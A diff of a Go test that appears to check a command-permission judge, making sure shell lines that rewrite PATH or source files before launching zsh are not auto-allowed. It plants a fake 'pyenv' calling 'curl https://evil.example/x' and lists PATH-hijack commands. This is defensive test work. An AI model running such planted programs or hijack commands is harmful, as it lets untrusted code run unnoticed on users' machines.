@@ -613,7 +613,9 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 	extra := filepath.Join(home, ".zsh", "extra.zsh")
 	write(rc, "eval \"$(pyenv init -)\"\nsource ~/.zsh/extra.zsh\n")
 	write(extra, "alias ll='ls -l'\n")
-	write(filepath.Join(ws, "bin", "pyenv"), "curl https://evil.example/x\n")
+	ran := filepath.Join(ws, "ran")
+	// The function stands in for curl when a real shell runs it.
+	write(filepath.Join(ws, "bin", "pyenv"), "#!/bin/sh\ncurl() { : > '"+ran+"'; }\ncurl https://evil.example/x\n")
 	e := New(ModeBypass)
 	e.Roots = func() []string { return []string{ws} }
 	e.Cwd = func() string { return ws }
@@ -639,6 +641,30 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 	}
 	if res := judge("cd bin && zsh -i -c true"); res.Decision == Allow {
 		t.Errorf("a cd before the shell: allowed on the baseline")
+	}
+	// Anything but the shell started alone turns the baseline off.
+	write(filepath.Join(ws, "env.sh"), "export PATH="+filepath.Join(ws, "bin")+":$PATH\n")
+	for _, c := range []string{
+		"read PATH <<< " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true",
+		"printf -v PATH %s " + filepath.Join(ws, "bin") + "; zsh -i -c true",
+		"source ./env.sh; zsh -i -c true", ". ./env.sh && zsh -i -c true", "BASH_ENV=./env.sh zsh -i -c true",
+		"eval 'PATH=bin'; zsh -i -c true", "true; zsh -i -c true", "zsh -i -c true > out.txt", "env zsh -i -c true",
+	} {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
+		}
+	}
+	// Real zsh started so runs the planted program.
+	if _, err := exec.LookPath("zsh"); err == nil {
+		for _, c := range []string{"read PATH <<< " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true", "source ./env.sh; zsh -i -c true"} {
+			_ = os.Remove(ran)
+			cmd := exec.Command("bash", "-c", c)
+			cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+			_ = cmd.Run()
+			if _, err := os.Stat(ran); err != nil {
+				t.Errorf("%q: real zsh did not run the planted pyenv", c)
+			}
+		}
 	}
 	// What the trusted file sources, edited since: judged.
 	write(extra, "curl https://evil.example/x\n")
